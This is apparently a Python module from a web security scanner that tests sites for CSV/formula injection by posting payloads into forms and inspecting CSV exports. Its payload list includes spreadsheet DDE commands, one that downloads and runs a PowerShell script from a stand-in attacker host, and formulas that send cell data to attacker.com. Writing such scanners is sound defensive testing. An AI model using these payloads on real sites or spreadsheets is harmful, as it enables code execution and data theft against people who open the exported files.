"""CSV Injection Scanner — detects CSV/formula injection vulnerabilities.

Tests if user-controlled data flows into CSV exports that could execute
malicious formulas when opened in Excel/LibreOffice.
"""

from __future__ import annotations

import re
from typing import List
from urllib.parse import urlparse

from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter


# CSV injection payloads
CSV_PAYLOADS = [
    ("=cmd|'/C calc'!A0", "Command execution via DDE"),
    ("=cmd|'/C powershell IEX(wget http://attacker.com/payload.ps1)'!A0", "PowerShell DDE"),
    ("@SUM(1+1)*cmd|'/C calc'!A0", "Excel @SUM DDE"),
    ("=1+1", "Formula evaluation"),
    ("=HYPERLINK(\"http://attacker.com/\"&A1\",\"Click\")", "Hyperlink data exfil"),
    ("=IMPORTXML(CONCATENATE(\"http://attacker.com/?c=\",A1),\"//\")", "XML import exfil"),
    ("+cmd|'/C calc'!A0", "Plus prefix DDE"),
    ("-cmd|'/C calc'!A0", "Minus prefix DDE"),
    ("@cmd|'/C calc'!A0", "At prefix DDE"),
    ("\\t=cmd|'/C calc'!A0", "Tab prefix DDE"),
    ("=SYSTEM(\"id\")", "SYSTEM formula"),
    ("=EXEC(\"cmd.exe /c calc\")", "EXEC formula"),
]


class CSVInjectionScanner:
    """Detects CSV injection vulnerabilities."""

    NAME = "csv_injection"

    def __init__(self, rps: float = 5.0, timeout: float = 10.0):
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    def scan_url(self, url: str, **kwargs) -> List[Finding]:
        """Scan for CSV injection vulnerabilities."""
        import httpx

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc

        client = httpx.Client(
            verify=True, timeout=self.timeout, follow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0"},
        )

        try:
            # Step 1: Find CSV export endpoints
            export_urls = self._find_csv_endpoints(client, url, host)

            # Step 2: Inject payloads into form fields that might flow to CSV
            findings.extend(self._test_form_injection(client, url, host))

            # Step 3: Test if CSV endpoints reflect injected data
            for export_url in export_urls:
                findings.extend(self._test_csv_export(client, export_url, host))

        finally:
            client.close()

        logger.info(f"CSV injection scan: {len(findings)} findings")
        return findings

    def _find_csv_endpoints(self, client, url: str, host: str) -> List[str]:
        """Find CSV export endpoints."""
        endpoints = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        export_paths = [
            "/export", "/export/csv", "/download", "/download/csv",
            "/api/export", "/api/v1/export", "/api/download",
            "/reports/export", "/reports/download",
            "/admin/export", "/admin/users/export",
            "/users/export", "/data/export",
            "/export?format=csv", "/download?format=csv",
        ]

        for path in export_paths:
            test_url = base + path
            self.limiter.wait(host)
            try:
                resp = client.get(test_url, follow_redirects=False)
                content_type = resp.headers.get("content-type", "")
                if resp.status_code == 200 and ("csv" in content_type or "text/plain" in content_type or "application/octet-stream" in content_type):
                    endpoints.append(test_url)
                elif resp.status_code == 200 and resp.text[:100].count(",") > 2:
                    endpoints.append(test_url)
            except Exception:
                pass

        return endpoints

    def _test_form_injection(self, client, url: str, host: str) -> List[Finding]:
        """Test if form fields can inject CSV formulas."""
        findings = []

        # Get the page to find forms
        self.limiter.wait(host)
        try:
            resp = client.get(url)
            body = resp.text
        except Exception:
            return findings

        # Find form fields
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.I)
        inputs = input_pattern.findall(body)

        # Also check textarea
        textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', re.I)
        inputs.extend(textarea_pattern.findall(body))

        # Test each input with CSV injection payload
        for payload, description in CSV_PAYLOADS[:3]:
            for input_name in inputs[:5]:
                self.limiter.wait(host)
                try:
                    resp = client.post(url, data={input_name: payload}, follow_redirects=False)
                    if resp.status_code in (200, 201, 302):
                        # Check if payload is reflected without sanitization
                        if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                            findings.append(Finding(
                                vuln_type="CSV Injection",
                                title=f"CSV injection via form field: {input_name}",
                                severity="MEDIUM",
                                url=url,
                                parameter=input_name,
                                method="POST",
                                payload=payload,
                                evidence=f"Payload reflected in response via field '{input_name}'",
                                description=f"Field '{input_name}' accepts CSV formula characters (=, +, -, @). If data flows to CSV export, formula injection is possible.",
                                remediation="Sanitize CSV output. Prefix cells starting with =, +, -, @ with single quote.",
                                cvss=6.5, cwe="CWE-1236",
                                tool=self.NAME, verified=False, confidence="MEDIUM",
                            ))
                except Exception:
                    pass

        return findings

    def _test_csv_export(self, client, export_url: str, host: str) -> List[Finding]:
        """Test if CSV export contains injected formulas."""
        findings = []

        self.limiter.wait(host)
        try:
            resp = client.get(export_url)
            if resp.status_code != 200:
                return findings

            body = resp.text[:5000]

            # Check for CSV injection indicators
            for payload, description in CSV_PAYLOADS:
                if payload in body:
                    findings.append(Finding(
                        vuln_type="CSV Injection",
                        title=f"CSV injection in export: {description}",
                        severity="HIGH",
                        url=export_url,
                        method="GET",
                        payload=payload,
                        evidence=f"Formula payload found in CSV export: {payload[:50]}",
                        description=f"CSV export contains unsanitized formula: {description}.",
                        remediation="Sanitize all CSV output. Prefix formula characters with single quote.",
                        cvss=7.5, cwe="CWE-1236",
                        tool=self.NAME, verified=True, confidence="HIGH",
                    ))

            # Check for any cell starting with formula characters
            lines = body.split("\n")
            for line in lines:
                cells = line.split(",")
                for cell in cells:
                    cell = cell.strip().strip('"')
                    if cell and cell[0] in ("=", "+", "-", "@"):
                        if len(cell) > 3:
                            findings.append(Finding(
                                vuln_type="CSV Injection",
                                title=f"Potential CSV formula in export",
                                severity="MEDIUM",
                                url=export_url,
                                method="GET",
                                payload=cell[:100],
                                evidence=f"Cell starting with '{cell[0]}' found: {cell[:50]}",
                                description="CSV export contains cell starting with formula character.",
                                remediation="Prefix formula cells with single quote to neutralize.",
                                cvss=5.3, cwe="CWE-1236",
                                tool=self.NAME, verified=True, confidence="LOW",
                            ))
                            break

        except Exception:
            pass

        return findings


__all__ = ["CSVInjectionScanner"]
